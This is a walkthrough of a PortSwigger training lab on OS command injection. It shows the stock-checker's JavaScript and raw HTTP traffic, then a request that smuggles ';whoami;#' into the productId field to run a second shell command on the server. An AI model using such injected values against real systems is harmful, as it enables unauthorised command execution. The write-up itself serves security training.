# [Lab 1: OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

---

## Description

This lab contains an [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.

---

## Solution

The description states that the application executes a shell command containing user-supplied product and store IDs. Find the section of the application that performs this functionality.

Selecting the `Hitch A Lift` product and then scrolling to the bottom of its product page, there is a form consisting of a dropdown input with the options  `London`, `Paris`, and `Milan` and a button that reads `Check Stock`.

![](images/Pasted%20image%2020210819171355.png)

Clicking the button with the `London` option set returns the value `62 units`.

![](images/Pasted%20image%2020210819171538.png)

The dropdown input corresopnds to the store ID and the current product corresponds to the product ID. This is the vulnerable functionality described in the challenge description.

The underlying HTML is a form with parameters `productId` and `storeId`. When the form is submitted, the following JavaScript function is called with `method` set to `POST`, `path` set to `/product/stock`, and `data` as the `productId` and `storeId` values.

```javascript
function checkStock(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t + " units")
                : "Could not fetch stock levels!"
            )
            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```

The sends an AJAX request like the following to the server.

```http
POST /product/stock HTTP/1.1
Host: ac931f8f1ffb665f806b737600fe0030.web-security-academy.net
Cookie: session=FHgOtgEDglQe8kiX6LYzsuVbgHSvBrSh
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac931f8f1ffb665f806b737600fe0030.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://ac931f8f1ffb665f806b737600fe0030.web-security-academy.net
Content-Length: 21
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&storeId=1
```

The `session` cookie is unnecessary and only retained for consistency. The response is just the number of items, which is rendered on the screen via the `checkStock()` function above.

```txt
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=4ZOrUaJbPtz4yzQJYjnYUSShi0uojzdj; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 3

82
```

The challenge description makes it clear that these two values are passed to a shell command whose output is returned. Perhaps the shell command looks something like the following:

```bash
checkStock.py $productId $storeId
```

Attempt to break out of this command by setting `productId` to `1 1;whoami;#`, causing the command `checkStock.py 1 1;whoami;# 1` to execute. The rseponse should return the output from both commands: `62` and the current username.

```http
POST /product/stock HTTP/1.1
Host: ac931f8f1ffb665f806b737600fe0030.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac931f8f1ffb665f806b737600fe0030.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://ac931f8f1ffb665f806b737600fe0030.web-security-academy.net
Content-Length: 38
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1+1%3bwhoami%3b%23&storeId=1
```

```txt
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=vW3gIcIETvTkZKnqAb8FBpQoe9wTA3LH; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 16

62
peter-dWQn8L
```

Success. The name of the current user is `peter-dWQn8L`.
